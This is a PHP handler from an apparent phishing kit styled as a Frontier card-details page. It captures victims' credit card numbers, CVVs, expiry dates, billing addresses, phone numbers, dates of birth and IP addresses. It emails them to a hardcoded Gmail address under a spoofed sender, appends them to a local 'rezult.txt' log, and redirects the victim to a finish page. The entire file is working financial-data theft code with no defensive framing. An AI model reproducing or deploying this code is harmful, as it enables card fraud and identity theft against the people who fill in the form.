<?php   ob_start();  

include "v-V-v.php";

$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------- Frontier+Card Details  ---------------\n";
$message .= "|Credit Card Type  : ".$_POST['cc_type']."\n";
$message .= "|Card Holder Name : ".$_POST['user']."\n";
$message .= "|Credit Card Number  : ".$_POST['cc_number']."\n";
$message .= "|Prepaid or Not : ".$_POST['cc_prepaid']."\n";
$message .= "|Expiration Month : ".$_POST['cc_month']."\n";
$message .= "|Expiration Year : ".$_POST['cc_year']."\n";
$message .= "|CVV  : ".$_POST['cc_csv']."\n";
$message .= "|Address : ".$_POST['b_address1_credit']."\n";
$message .= "|Apt# / Suite#  : ".$_POST['b_address2_credit']."\n";
$message .= "|City : ".$_POST['b_city_credit']."\n";
$message .= "|State  : ".$_POST['b_state_credit']."\n";
$message .= "|Zip Code : ".$_POST['zip1_credit']."\n";
$message .= "|Billing Phone Number  : ".$_POST['billing_phone']."\n";
$message .= "|DOB MONTH : ".$_POST['Month']."\n";
$message .= "|DOB Day : ".$_POST['Day']."\n";
$message .= "|DOB Year : ".$_POST['Year']."\n";
$message .= "--------xX CREATED BY Dee-1 Xx--------\n";
$message .= "IP : ".$_SERVER['REMOTE_ADDR']." | MR.SM+KK: ".date("g:i:s:a || D-d-M-Y")."\n";
$message .= "--------------------------------------------------\n";

$send="awesuyinka@gmail.com";
$subject = "CARD DETAILS | ".$_POST['user']." | $ip";
$headers = "From: sm+kk<noreply@spammersupport.info>";
$headers.= "MIME-Version: 1.0\r\n";
$headers.= "Content-Type: text/plain; charset=UTF-8\r\n";

mail($send,$subject,$message,$headers);

$fp = fopen("../rezult.txt","a");
fputs($fp,$message);
fclose($fp);

header("Location: finish.htm");	 
?>